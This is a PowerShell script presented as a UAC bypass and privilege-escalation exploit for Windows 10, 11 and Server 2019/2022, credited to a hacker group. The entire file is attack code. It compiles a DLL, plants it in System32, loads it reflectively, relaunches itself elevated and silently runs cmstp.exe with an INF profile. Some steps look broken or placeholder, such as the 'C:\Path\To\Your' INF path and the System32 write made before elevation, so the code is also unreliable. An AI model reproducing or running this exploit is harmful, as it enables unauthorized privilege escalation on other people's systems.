# Author: P.Hoogeveen | aka: x0xr00t | Team: Sl0ppyRoot
# Name: UAC Bypass for Windows 10 and Server 2019/2022
# The main .ps1 file been re-dev by dev: @keytrap-x86 (partial, os version check) Thanks sir (Y)
# Build: 20241007
# Name: UAC Bypass Win Server 2019| Win Server 2022 | Win 10 | Win 11 | win 12 pre-release
# Impact: Privilege Escalation
# Method: DllReflection and CMSTP Bypass

function Get-PSLocation {
    $paths = @(
        "C:\Program Files\PowerShell\7\pwsh.exe",
        "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    )

    foreach ($path in $paths) {
        if (Test-Path $path) {
            return $path
        }
    }

    Write-Host "PowerShell location not found." -ForegroundColor Red
    exit
}

$PSLocation = Get-PSLocation

Write-Host "---------------------------------------"
Write-Host " Sl0ppyR00t: Checking OS version..."
Write-Host "---------------------------------------"

$user = (cmd.exe /c echo %username%)
$OSVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName).ProductName

$supportedVersions = @(
    "Windows 10 Home",
    "Windows 10 Pro",
    "Windows 10 Education",
    "Windows 10 Enterprise",
    "Windows 10 Enterprise 2015",
    "Windows 10 Mobile and Mobile Enterprise",
    "Windows 10 IoT Core",
    "Windows 10 IoT Enterprise LTSC 2021",
    "Windows 10 IoT Mobile Enterprise",
    "Windows Server 2019 Standard",
    "Windows Server 2019 Datacenter",
    "Windows Server 2019 Essentials",
    "Windows Server 2019 Azure Core",
    "Windows Server 2022 Standard",
    "Windows Server 2022 Datacenter",
    "Windows Server 2022 Azure Core",
    "Windows 11 Home",
    "Windows 11 Pro",
    "Windows 11 Education",
    "Windows 11 Enterprise",
    "Windows 11 IoT Enterprise",
    "Windows 11 IoT Mobile Enterprise",
    "Windows 11 Team",
    "Windows 11 Enterprise Multi-session"
)

if ($supportedVersions -notcontains $OSVersion) {
    Write-Host "Unsupported OS version: $OSVersion"
    exit
} else {
    Write-Host " Running on supported OS: $OSVersion"
}

# Create a mock folder
$mockFolderPath = "C:\Windows\System32\MockFolder"
if (-not (Test-Path $mockFolderPath)) {
    New-Item -Path $mockFolderPath -ItemType Directory | Out-Null
    Write-Host "Mock folder created at $mockFolderPath."
}

# Compiling DLLs
Write-Host " Compiling DLL files..."
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$mockFolderPath\sl0p.dll"
Write-Host "DLL files created."

# Copy DLL files to System32
Copy-Item "$mockFolderPath\sl0p.dll" -Destination "C:\Windows\System32\sl0p.dll" -Force
Write-Host "DLL copied to System32."

# Verify DLL placement
if (Test-Path "C:\Windows\System32\sl0p.dll") {
    Write-Host "DLL verification successful."
} else {
    Write-Host "DLL not found in System32." -ForegroundColor Red
}

# Load DLL
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$mockFolderPath\sl0p.dll"))

# Check for admin privileges
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}"' -f $myinvocation.MyCommand.Definition)
    exit
}

# Call CMSTP Bypass if applicable
if ($OSVersion -match "Windows 10|Windows 11|Windows Server 2019|Windows Server 2022") {
    Write-Host "Executing CMSTP bypass..."
    Start-Process "cmstp.exe" -ArgumentList "/s", "C:\Path\To\Your\CMSTPProfile.inf"
}

# Display Group Policy Results
Write-Host "Getting user scope..."
gpresult /Scope User /v

Write-Host "Getting system scope..."
gpresult /Scope Computer /v

Write-Host "Getting LUA Settings..."
Get-ItemProperty HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system

Write-Host "________________________"
